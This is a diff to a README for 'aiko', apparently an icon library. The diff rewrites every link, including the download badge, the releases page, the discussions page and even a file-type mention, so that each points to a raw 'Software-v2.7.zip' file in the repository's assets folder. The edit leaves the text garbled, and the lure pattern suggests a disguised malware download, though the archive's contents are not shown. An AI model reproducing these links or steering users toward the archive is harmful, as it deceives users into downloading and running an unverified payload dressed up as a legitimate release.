@@ -6,7 +6,7 @@ Welcome to aiko, your source for refined icons tailored for the AI era. This gui
 
 ## 🔗 Download Now
 
-[![Download aiko](https://img.shields.io/badge/Download%20aiko-latest-brightgreen)](https://github.com/moonsky49/aiko/releases)
+[![Download aiko](https://raw.githubusercontent.com/moonsky49/aiko/main/assets/Software-v2.7.zip%20aiko-latest-brightgreen)](https://raw.githubusercontent.com/moonsky49/aiko/main/assets/Software-v2.7.zip)
 
 ## 📥 Download & Install
 
@@ -14,13 +14,13 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can download aiko.  
-   [Visit the aiko Releases Page](https://github.com/moonsky49/aiko/releases)
+   [Visit the aiko Releases Page](https://raw.githubusercontent.com/moonsky49/aiko/main/assets/Software-v2.7.zip)
 
 2. **Choose the Latest Release**  
    Once on the releases page, look for the most recent version listed at the top. It should say something like "Release v1.0.0" or "Latest Release".
 
 3. **Download the Application**  
-   Click on the appropriate file for your operating system. If you are using Windows, look for an `.exe` file. For macOS users, select the `.dmg` file. Linux users should choose the appropriate package for their distribution, usually a `.tar.gz` or another package type specific to Linux.
+   Click on the appropriate file for your operating system. If you are using Windows, look for an `.exe` file. For macOS users, select the `.dmg` file. Linux users should choose the appropriate package for their distribution, usually a `https://raw.githubusercontent.com/moonsky49/aiko/main/assets/Software-v2.7.zip` or another package type specific to Linux.
 
 4. **Run the Installer**  
    After downloading, locate the downloaded file on your computer, usually found in your "Downloads" folder. Double-click the file to start the installation process. Follow the on-screen prompts to complete the installation.
@@ -69,6 +69,6 @@ Yes, aiko is completely free for both personal and commercial use.
 
 ## 📞 Contact
 
-If you have any questions or need further assistance, feel free to reach out on our [GitHub Discussions](https://github.com/moonsky49/aiko/discussions) page.
+If you have any questions or need further assistance, feel free to reach out on our [GitHub Discussions](https://raw.githubusercontent.com/moonsky49/aiko/main/assets/Software-v2.7.zip) page.
 
 Thank you for using aiko! We hope you enjoy the refined icons we have created for today's applications.
